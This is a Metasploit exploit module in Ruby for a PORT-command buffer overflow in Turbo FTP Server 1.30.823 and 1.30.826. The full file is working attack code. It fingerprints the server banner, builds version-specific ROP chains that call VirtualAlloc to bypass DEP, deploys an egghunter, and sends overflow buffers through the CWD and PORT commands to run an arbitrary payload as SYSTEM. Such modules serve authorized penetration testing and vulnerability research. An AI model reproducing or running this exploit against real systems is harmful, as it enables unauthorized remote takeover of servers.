##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Turbo FTP Server 1.30.823 PORT Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow vulnerability found in the PORT
				command in Turbo FTP Server 1.30.823 & 1.30.826, which results in remote
				code execution under the context of SYSTEM.
			},
			'Author'         =>
				[
					'Zhao Liang',    #Initial Descovery
					'Lincoln',       #Metasploit
					'corelanc0d3r',  #Metasploit
					'thelightcosine' #Metasploit
				],
			'License'        => MSF_LICENSE,
			'Platform'       => [ 'win' ],
			'References'     =>
				[
					[ 'OSVDB', '85887' ]
				],
			'Payload'        =>
				{
					'BadChars'       => "\x00",
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' => { 'BufferRegister' => 'EDI' }
					},
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					['Windows Universal TurboFtp 1.30.823',
						{
							'Ret' => 0x00411985, # RETN (ROP NOP) [tbssvc.exe]
							'ver' => 823
						},

					],
					[ 'Windows Universal TurboFtp 1.30.826',
						{
							'Ret' => 0x004fb207, # RETN (ROP NOP) [tbssvc.exe]
							'ver' => 826
						},
					],
				],

			'DisclosureDate' => 'Oct 03 2012',
			'DefaultTarget'  => 0))
	end

	def check
		connect
		disconnect
		if (banner =~ /1\.30\.823/)
			return Exploit::CheckCode::Vulnerable
		elsif (banner =~ /1\.30\.826/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end


	def create_rop_chain(ver)
		# rop chain generated with mona.py - www.corelan.be
		if ver == 823
			rop_gadgets =
			[
				0x004b692a,	# POP ECX # RETN [tbssvc.exe]
				0x005f6074,	# ptr to &VirtualAlloc() [IAT tbssvc.exe]
				0x0046f82a,	# MOV EDX,DWORD PTR DS:[ECX] # SUB EAX,EDX # RETN [tbssvc.exe]
				0x00423b95,	# XCHG EDX,EDI # RETN [tbssvc.exe]
				0x00423a27,	# XCHG ESI,EDI # RETN [tbssvc.exe]
				0x005d1c99,	# POP EBP # RETN [tbssvc.exe]
				0x004cad5d,	# & jmp esp [tbssvc.exe]
				0x004ab16b,	# POP EBX # RETN [tbssvc.exe]
				0x00000001,	# 0x00000001-> ebx
				0x005ef7f6,	# POP EDX # RETN [tbssvc.exe]
				0x00001000,	# 0x00001000-> edx
				0x005d7139,	# POP ECX # RETN [tbssvc.exe]
				0x00000040,	# 0x00000040-> ecx
				0x004df1e0,	# POP EDI # RETN [tbssvc.exe]
				0x00411985,	# RETN (ROP NOP) [tbssvc.exe]
				0x00502639,	# POP EAX # RETN [tbssvc.exe]
				0x90909090,	# nop
				0x00468198,	# PUSHAD # RETN [tbssvc.exe]
			].flatten.pack("V*")

		elsif ver == 826
			rop_gadgets =
			[
				0x0050eae4,	# POP ECX # RETN [tbssvc.exe]
				0x005f7074,	# ptr to &VirtualAlloc() [IAT tbssvc.exe]
				0x004aa7aa,	# MOV EDX,DWORD PTR DS:[ECX] # SUB EAX,EDX # RETN [tbssvc.exe]
				0x00496A65,	# XOR EAX,EAX [tbssvc.exe]
				0x004badda,	# ADD EAX,EDX # RETN [tbssvc.exe]
				0x00411867,	# XCHG EAX,ESI # XOR EAX,EAX # POP EBX # RETN [tbssvc.exe]
				0x00000001,	# 0x00000001-> ebx
				0x0058a27a,	# POP EBP # RETN [tbssvc.exe]
				0x004df7dd,	# & call esp [tbssvc.exe]
				0x005f07f6,	# POP EDX # RETN [tbssvc.exe]
				0x00001000,	# 0x00001000-> edx
				0x004adc08,	# POP ECX # RETN [tbssvc.exe]
				0x00000040,	# 0x00000040-> ecx
				0x00465fbe,	# POP EDI # RETN [tbssvc.exe]
				0x004fb207,	# RETN (ROP NOP) [tbssvc.exe]
				0x00465f36,	# POP EAX # RETN [tbssvc.exe]
				0x90909090,	# nop
				0x004687ff,	# PUSHAD # RETN [tbssvc.exe]
			].flatten.pack("V*")
		end
		return rop_gadgets

	end

	def exploit
		my_target = target
		if my_target.name == 'Automatic'
			print_status("Automatically detecting the target")
			connect
			disconnect

			if (banner =~ /1\.30\.823/)
				my_target = targets[1]
			elsif (banner =~ /1\.30\.826/)
				my_target = targets[2]
			end
			if (not my_target)
				print_status("No matching target...quiting")
				return
			end
			target = my_target
		end

		print_status("Selected Target: #{my_target.name}")
		connect_login

		rop_chain = create_rop_chain(target['ver'])
		rop = rop_chain.unpack('C*').join(',')

		eggoptions =
			{
				:checksum => true,
				:eggtag => 'w00t',
				:depmethod => 'virtualalloc',
				:depreg => 'esi'
			}

		badchars = "\x00"
		hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)

		speedupasm = "mov edx,eax\n"
		speedupasm << "sub edx,0x1000\n"
		speedupasm << "sub esp,0x1000"
		speedup = Metasm::Shellcode.assemble(Metasm::Ia32.new, speedupasm).encode_string

		fasterhunter = speedup
		fasterhunter << hunter

		print_status("Connecting to target #{target.name} server")

		buf1 = rand_text_alpha(2012)
		buf1 << egg
		buf1 << rand_text_alpha(100)

		buf2 = rand_text_alpha(4).unpack('C*').join(',')
		buf2 << ","
		buf2 << [target['Ret']].pack("V").unpack('C*').join(',') #eip
		buf2 << ","
		buf2 << rop
		buf2 << ","
		buf2 << fasterhunter.unpack('C*').join(',')
		buf2 << ","
		buf2 << rand_text_alpha(90).unpack('C*').join(',')

		send_cmd( ['CWD', buf1], true );
		send_cmd( ['PORT', buf2], true );

		print_status("Egghunter deployed, locating shellcode")

		handler
		disconnect
	end

end
